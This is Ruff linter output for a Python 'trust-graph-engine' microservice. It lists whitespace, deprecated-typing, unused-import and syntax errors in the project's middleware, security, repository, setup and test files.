95 |         self.tokens = {}  # client_id -> (tokens, last_update)
96 |         self.rate = requests_per_minute / 60.0  # tokens per second
97 |     
   | ^^^^
98 |     async def dispatch(self, request: Request, call_next: Callable):
99 |         # Skip health checks and metrics
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:102:1
    |
100 |         if request.url.path in ["/health", "/health/ready", "/health/live", "/metrics"]:
101 |             return await call_next(request)
102 |         
    | ^^^^^^^^
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:105:1
    |
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
105 |         
    | ^^^^^^^^
106 |         # Check rate limit
107 |         if not self._allow_request(client_id):
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:120:1
    |
118 |                 headers={"Retry-After": "60"},
119 |             )
120 |         
    | ^^^^^^^^
121 |         return await call_next(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:122:1
    |
121 |         return await call_next(request)
122 |     
    | ^^^^
123 |     def _get_client_id(self, request: Request) -> str:
124 |         """Get client identifier for rate limiting"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:128:1
    |
126 |         if hasattr(request.state, "user"):
127 |             return f"user:{request.state.user}"
128 |         
    | ^^^^^^^^
129 |         # Fall back to IP address
130 |         forwarded_for = request.headers.get("X-Forwarded-For")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:133:1
    |
131 |         if forwarded_for:
132 |             return f"ip:{forwarded_for.split(',')[0].strip()}"
133 |         
    | ^^^^^^^^
134 |         return f"ip:{request.client.host}"
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:135:1
    |
134 |         return f"ip:{request.client.host}"
135 |     
    | ^^^^
136 |     def _allow_request(self, client_id: str) -> bool:
137 |         """Check if request is allowed (token bucket algorithm)"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:139:1
    |
137 |         """Check if request is allowed (token bucket algorithm)"""
138 |         now = time.time()
139 |         
    | ^^^^^^^^
140 |         if client_id not in self.tokens:
141 |             self.tokens[client_id] = (self.burst - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:143:1
    |
141 |             self.tokens[client_id] = (self.burst - 1, now)
142 |             return True
143 |         
    | ^^^^^^^^
144 |         tokens, last_update = self.tokens[client_id]
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:145:1
    |
144 |         tokens, last_update = self.tokens[client_id]
145 |         
    | ^^^^^^^^
146 |         # Add tokens based on time elapsed
147 |         elapsed = now - last_update
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:149:1
    |
147 |         elapsed = now - last_update
148 |         tokens = min(self.burst, tokens + elapsed * self.rate)
149 |         
    | ^^^^^^^^
150 |         if tokens >= 1:
151 |             self.tokens[client_id] = (tokens - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:160:1
    |
158 | class AuthenticationMiddleware(BaseHTTPMiddleware):
159 |     """Authentication middleware"""
160 |     
    | ^^^^
161 |     # Public endpoints that don't require authentication
162 |     PUBLIC_PATHS = [
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:173:1
    |
171 |         "/api/v1/openapi.json",
172 |     ]
173 |     
    | ^^^^
174 |     async def dispatch(self, request: Request, call_next: Callable):
175 |         # Skip public endpoints
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:178:1
    |
176 |         if request.url.path in self.PUBLIC_PATHS:
177 |             return await call_next(request)
178 |         
    | ^^^^^^^^
179 |         # Try authentication
180 |         authenticated = False
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:182:1
    |
180 |         authenticated = False
181 |         user = None
182 |         
    | ^^^^^^^^
183 | # Try API key authentication
184 |         api_key = request.headers.get("X-API-Key")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:210:1
    |
208 |                 headers={"WWW-Authenticate": "Bearer"},
209 |             )
210 |         
    | ^^^^^^^^
211 |         # Add user to request state
212 |         request.state.user = user
    |
help: Remove whitespace from blank line

invalid-syntax: unindent does not match any outer indentation level
   --> emergent-microservices\trust-graph-engine\app\middleware.py:212:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
    | ^^^^^^^^
213 |         
214 |         return await call_next(request)
    |

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\middleware.py:213:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
213 |         
    | ^^^^^^^^
214 |         return await call_next(request)
    |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> emergent-microservices\trust-graph-engine\app\middleware.py:214:1
    |
212 |         request.state.user = user
213 |         
214 |         return await call_next(request)
    | ^^^^^^^^
    |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\trust-graph-engine\app\models.py:2:1
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 | from uuid import UUID, uuid4
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\trust-graph-engine\app\models.py:2:1
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 | from uuid import UUID, uuid4
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\trust-graph-engine\app\models.py:2:31
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  |                               ^^^^
3 | from uuid import UUID, uuid4
  |
help: Remove unused import

F401 [*] `typing.Optional` imported but unused
 --> emergent-microservices\trust-graph-engine\app\models.py:2:37
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  |                                     ^^^^^^^^
3 | from uuid import UUID, uuid4
  |
help: Remove unused import

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\trust-graph-engine\app\models.py:19:15
   |
17 |     trust_tier: int = 3  # Based on Project-AI tiers
18 |     provenance_log_hash: str
19 |     metadata: Dict[str, Any] = {}
   |               ^^^^
20 |     created_at: datetime = Field(default_factory=datetime.now)
21 |     updated_at: datetime = Field(default_factory=datetime.now)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\trust-graph-engine\app\models.py:38:15
   |
36 |     alias: str
37 |     provenance_log_hash: str
38 |     metadata: Dict[str, Any] = {}
   |               ^^^^
   |
help: Replace with `dict`

F401 [*] `datetime.datetime` imported but unused
 --> emergent-microservices\trust-graph-engine\app\repository.py:5:22
  |
3 | """
4 |
5 | from datetime import datetime
  |                      ^^^^^^^^
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |
help: Remove unused import: `datetime.datetime`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\trust-graph-engine\app\repository.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\trust-graph-engine\app\repository.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\trust-graph-engine\app\repository.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\trust-graph-engine\app\repository.py:15:20
   |
13 | class Database:
14 |     def __init__(self):
15 |         self.data: Dict[str, Any] = {"identities": {}, "relations": []}
   |                    ^^^^
16 |         self.connected = False
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\trust-graph-engine\app\repository.py:30:56
   |
28 |         self.db = database
29 |
30 |     async def get_identity(self, identity_id: UUID) -> Optional[TrustIdentity]:
   |                                                        ^^^^^^^^^^^^^^^^^^^^^^^
31 |         return self.db.data["identities"].get(str(identity_id))
   |
help: Convert to `X | None`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
  --> emergent-microservices\trust-graph-engine\app\repository.py:39:10
   |
37 |     async def list_identities(
38 |         self, offset: int = 0, limit: int = 20
39 |     ) -> Tuple[List[TrustIdentity], int]:
   |          ^^^^^
40 |         items = list(self.db.data["identities"].values())
41 |         return items[offset : offset + limit], len(items)
   |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\trust-graph-engine\app\repository.py:39:16
   |
37 |     async def list_identities(
38 |         self, offset: int = 0, limit: int = 20
39 |     ) -> Tuple[List[TrustIdentity], int]:
   |                ^^^^
40 |         items = list(self.db.data["identities"].values())
41 |         return items[offset : offset + limit], len(items)
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\trust-graph-engine\app\repository.py:47:66
   |
45 |         return relation
46 |
47 |     async def get_relations_for_target(self, target_id: UUID) -> List[TrustRelation]:
   |                                                                  ^^^^
48 |         return [r for r in self.db.data["relations"] if r.target_id == target_id]
   |
help: Replace with `list`

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\trust-graph-engine\app\routes.py:5:1
  |
3 | """
4 |
5 | from typing import List
  | ^^^^^^^^^^^^^^^^^^^^^^^
6 | from uuid import UUID
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\trust-graph-engine\app\routes.py:5:20
  |
3 | """
4 |
5 | from typing import List
  |                    ^^^^
6 | from uuid import UUID
  |
help: Remove unused import: `typing.List`

F401 [*] `fastapi.Query` imported but unused
  --> emergent-microservices\trust-graph-engine\app\routes.py:8:53
   |
 6 | from uuid import UUID
 7 |
 8 | from fastapi import APIRouter, Body, Depends, Path, Query, status
   |                                                     ^^^^^
 9 |
10 | from .logging_config import logger
   |
help: Remove unused import: `fastapi.Query`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> emergent-microservices\trust-graph-engine\app\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> emergent-microservices\trust-graph-engine\app\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\trust-graph-engine\app\security.py:32:44
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                            ^^^^^^^^^^^^^^^^^^^^^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\trust-graph-engine\app\security.py:32:53
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                                     ^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\trust-graph-engine\app\security.py:49:37
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                     ^^^^^^^^^^^^^^^^^^^^^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\trust-graph-engine\app\security.py:49:46
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                              ^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> emergent-microservices\trust-graph-engine\app\security.py:103:19
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                   ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> emergent-microservices\trust-graph-engine\app\security.py:103:29
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                             ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `list`

F401 [*] `datetime.timezone` imported but unused
 --> emergent-microservices\trust-graph-engine\app\services.py:5:32
  |
3 | """
4 |
5 | from datetime import datetime, timezone
  |                                ^^^^^^^^
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |
help: Remove unused import: `datetime.timezone`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\trust-graph-engine\app\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\trust-graph-engine\app\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\trust-graph-engine\app\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

F401 [*] `typing.Any` imported but unused
 --> emergent-microservices\trust-graph-engine\app\services.py:6:20
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                    ^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Dict` imported but unused
 --> emergent-microservices\trust-graph-engine\app\services.py:6:25
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                         ^^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\trust-graph-engine\app\services.py:6:31
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                               ^^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Optional` imported but unused
 --> emergent-microservices\trust-graph-engine\app\services.py:6:37
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                                     ^^^^^^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Tuple` imported but unused
 --> emergent-microservices\trust-graph-engine\app\services.py:6:47
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                                               ^^^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `.models.ReputationUpdate` imported but unused
  --> emergent-microservices\trust-graph-engine\app\services.py:10:37
   |
 9 | from .logging_config import logger
10 | from .models import IdentityCreate, ReputationUpdate, TrustIdentity, TrustRelation
   |                                     ^^^^^^^^^^^^^^^^
11 | from .repository import TrustRepository
   |
help: Remove unused import: `.models.ReputationUpdate`

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\trust-graph-engine\database\scripts\integrity_check.py:7:1
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\trust-graph-engine\database\scripts\integrity_check.py:7:1
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\trust-graph-engine\database\scripts\integrity_check.py:7:20
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  |                    ^^^^
  |
help: Remove unused import

F401 [*] `typing.Tuple` imported but unused
 --> emergent-microservices\trust-graph-engine\database\scripts\integrity_check.py:7:26
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  |                          ^^^^^
  |
help: Remove unused import

F821 Undefined name `check_integrity`
  --> emergent-microservices\trust-graph-engine\database\scripts\integrity_check.py:13:20
   |
11 |     print("Running database integrity checks...")
12 |
13 |     errors = await check_integrity()
   |                    ^^^^^^^^^^^^^^^
14 |
15 |     if errors:
   |

F821 Undefined name `rollback_migration`
  --> emergent-microservices\trust-graph-engine\database\scripts\rollback.py:16:21
   |
15 |     version = int(sys.argv[1])
16 |     success = await rollback_migration(version)
   |                     ^^^^^^^^^^^^^^^^^^
17 |     sys.exit(0 if success else 1)
   |

invalid-syntax: missing closing quote in string literal
 --> emergent-microservices\trust-graph-engine\setup.py:6:17
  |
4 |     name="Distributed Reputation & Trust Graph Engine",
5 |     version="1.0.0",
6 |     description="Build:
  |                 ^^^^^^^
7 | Verifiable identity nodes
8 | Weighted trust edges
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\trust-graph-engine\setup.py:7:1
  |
5 |     version="1.0.0",
6 |     description="Build:
7 | Verifiable identity nodes
  | ^^^^^^^^^^
8 | Weighted trust edges
9 | Sybil resistance scoring
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\trust-graph-engine\setup.py:7:12
  |
5 |     version="1.0.0",
6 |     description="Build:
7 | Verifiable identity nodes
  |            ^^^^^^^^
8 | Weighted trust edges
9 | Sybil resistance scoring
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\trust-graph-engine\setup.py:7:21
  |
5 |     version="1.0.0",
6 |     description="Build:
7 | Verifiable identity nodes
  |                     ^^^^^
8 | Weighted trust edges
9 | Sybil resistance scoring
  |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:8:1
   |
 6 |     description="Build:
 7 | Verifiable identity nodes
 8 | Weighted trust edges
   | ^^^^^^^^
 9 | Sybil resistance scoring
10 | On-chain optional anchoring
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:8:10
   |
 6 |     description="Build:
 7 | Verifiable identity nodes
 8 | Weighted trust edges
   |          ^^^^^
 9 | Sybil resistance scoring
10 | On-chain optional anchoring
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:8:16
   |
 6 |     description="Build:
 7 | Verifiable identity nodes
 8 | Weighted trust edges
   |                ^^^^^
 9 | Sybil resistance scoring
10 | On-chain optional anchoring
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:9:1
   |
 7 | Verifiable identity nodes
 8 | Weighted trust edges
 9 | Sybil resistance scoring
   | ^^^^^
10 | On-chain optional anchoring
11 | Real-time trust API
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:9:7
   |
 7 | Verifiable identity nodes
 8 | Weighted trust edges
 9 | Sybil resistance scoring
   |       ^^^^^^^^^^
10 | On-chain optional anchoring
11 | Real-time trust API
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:9:18
   |
 7 | Verifiable identity nodes
 8 | Weighted trust edges
 9 | Sybil resistance scoring
   |                  ^^^^^^^
10 | On-chain optional anchoring
11 | Real-time trust API
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:10:1
   |
 8 | Weighted trust edges
 9 | Sybil resistance scoring
10 | On-chain optional anchoring
   | ^^
11 | Real-time trust API
12 | Use cases:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:10:10
   |
 8 | Weighted trust edges
 9 | Sybil resistance scoring
10 | On-chain optional anchoring
   |          ^^^^^^^^
11 | Real-time trust API
12 | Use cases:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:10:19
   |
 8 | Weighted trust edges
 9 | Sybil resistance scoring
10 | On-chain optional anchoring
   |                   ^^^^^^^^^
11 | Real-time trust API
12 | Use cases:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:11:1
   |
 9 | Sybil resistance scoring
10 | On-chain optional anchoring
11 | Real-time trust API
   | ^^^^
12 | Use cases:
13 | Anti-bot verification
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:11:11
   |
 9 | Sybil resistance scoring
10 | On-chain optional anchoring
11 | Real-time trust API
   |           ^^^^^
12 | Use cases:
13 | Anti-bot verification
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:11:17
   |
 9 | Sybil resistance scoring
10 | On-chain optional anchoring
11 | Real-time trust API
   |                 ^^^
12 | Use cases:
13 | Anti-bot verification
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:12:1
   |
10 | On-chain optional anchoring
11 | Real-time trust API
12 | Use cases:
   | ^^^
13 | Anti-bot verification
14 | Secure marketplaces
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:12:5
   |
10 | On-chain optional anchoring
11 | Real-time trust API
12 | Use cases:
   |     ^^^^^
13 | Anti-bot verification
14 | Secure marketplaces
   |

invalid-syntax: Expected `,`, found `:`
  --> emergent-microservices\trust-graph-engine\setup.py:12:10
   |
10 | On-chain optional anchoring
11 | Real-time trust API
12 | Use cases:
   |          ^
13 | Anti-bot verification
14 | Secure marketplaces
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\trust-graph-engine\setup.py:13:1
   |
11 | Real-time trust API
12 | Use cases:
13 | Anti-bot verification
   | ^^^^^^^^
14 | Secure marketplaces
15 | Intelligence vetting networks
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:13:10
   |
11 | Real-time trust API
12 | Use cases:
13 | Anti-bot verification
   |          ^^^^^^^^^^^^
14 | Secure marketplaces
15 | Intelligence vetting networks
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:14:1
   |
12 | Use cases:
13 | Anti-bot verification
14 | Secure marketplaces
   | ^^^^^^
15 | Intelligence vetting networks
16 | High-signal communication channels
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:14:8
   |
12 | Use cases:
13 | Anti-bot verification
14 | Secure marketplaces
   |        ^^^^^^^^^^^^
15 | Intelligence vetting networks
16 | High-signal communication channels
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:15:1
   |
13 | Anti-bot verification
14 | Secure marketplaces
15 | Intelligence vetting networks
   | ^^^^^^^^^^^^
16 | High-signal communication channels
17 | If done correctly, this becomes infrastructure.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:15:14
   |
13 | Anti-bot verification
14 | Secure marketplaces
15 | Intelligence vetting networks
   |              ^^^^^^^
16 | High-signal communication channels
17 | If done correctly, this becomes infrastructure.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:15:22
   |
13 | Anti-bot verification
14 | Secure marketplaces
15 | Intelligence vetting networks
   |                      ^^^^^^^^
16 | High-signal communication channels
17 | If done correctly, this becomes infrastructure.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:16:1
   |
14 | Secure marketplaces
15 | Intelligence vetting networks
16 | High-signal communication channels
   | ^^^^
17 | If done correctly, this becomes infrastructure.",
18 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:16:13
   |
14 | Secure marketplaces
15 | Intelligence vetting networks
16 | High-signal communication channels
   |             ^^^^^^^^^^^^^
17 | If done correctly, this becomes infrastructure.",
18 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:16:27
   |
14 | Secure marketplaces
15 | Intelligence vetting networks
16 | High-signal communication channels
   |                           ^^^^^^^^
17 | If done correctly, this becomes infrastructure.",
18 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:17:1
   |
15 | Intelligence vetting networks
16 | High-signal communication channels
17 | If done correctly, this becomes infrastructure.",
   | ^^
18 |     author="IAmSoThirsty",
19 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:17:4
   |
15 | Intelligence vetting networks
16 | High-signal communication channels
17 | If done correctly, this becomes infrastructure.",
   |    ^^^^
18 |     author="IAmSoThirsty",
19 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:17:9
   |
15 | Intelligence vetting networks
16 | High-signal communication channels
17 | If done correctly, this becomes infrastructure.",
   |         ^^^^^^^^^
18 |     author="IAmSoThirsty",
19 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\trust-graph-engine\setup.py:17:20
   |
15 | Intelligence vetting networks
16 | High-signal communication channels
17 | If done correctly, this becomes infrastructure.",
   |                    ^^^^
18 |     author="IAmSoThirsty",
19 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:17:25
   |
15 | Intelligence vetting networks
16 | High-signal communication channels
17 | If done correctly, this becomes infrastructure.",
   |                         ^^^^^^^
18 |     author="IAmSoThirsty",
19 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:17:33
   |
15 | Intelligence vetting networks
16 | High-signal communication channels
17 | If done correctly, this becomes infrastructure.",
   |                                 ^^^^^^^^^^^^^^
18 |     author="IAmSoThirsty",
19 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\trust-graph-engine\setup.py:17:33
   |
15 | Intelligence vetting networks
16 | High-signal communication channels
17 | If done correctly, this becomes infrastructure.",
   |                                 ^^^^^^^^^^^^^^^
18 |     author="IAmSoThirsty",
19 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\trust-graph-engine\setup.py:17:48
   |
15 | Intelligence vetting networks
16 | High-signal communication channels
17 | If done correctly, this becomes infrastructure.",
   |                                                ^^
18 |     author="IAmSoThirsty",
19 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found string
  --> emergent-microservices\trust-graph-engine\setup.py:17:48
   |
15 | Intelligence vetting networks
16 | High-signal communication channels
17 | If done correctly, this becomes infrastructure.",
   |                                                ^^
18 |     author="IAmSoThirsty",
19 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\setup.py:18:5
   |
16 | High-signal communication channels
17 | If done correctly, this becomes infrastructure.",
18 |     author="IAmSoThirsty",
   |     ^^^^^^
19 |     packages=find_packages(exclude=["tests", "tests.*"]),
20 |     python_requires=">=3.11",
   |

UP035 [*] Import from `collections.abc` instead: `AsyncGenerator`
 --> emergent-microservices\trust-graph-engine\tests\conftest.py:4:1
  |
3 | import asyncio
4 | from typing import AsyncGenerator
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5 |
6 | import pytest
  |
help: Import from `collections.abc`

F401 [*] `typing.AsyncGenerator` imported but unused
 --> emergent-microservices\trust-graph-engine\tests\conftest.py:4:20
  |
3 | import asyncio
4 | from typing import AsyncGenerator
  |                    ^^^^^^^^^^^^^^
5 |
6 | import pytest
  |
help: Remove unused import: `typing.AsyncGenerator`

F704 `await` statement outside of a function
  --> emergent-microservices\trust-graph-engine\tests\conftest.py:30:1
   |
29 | database.data.clear()
30 | await database.disconnect()
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^
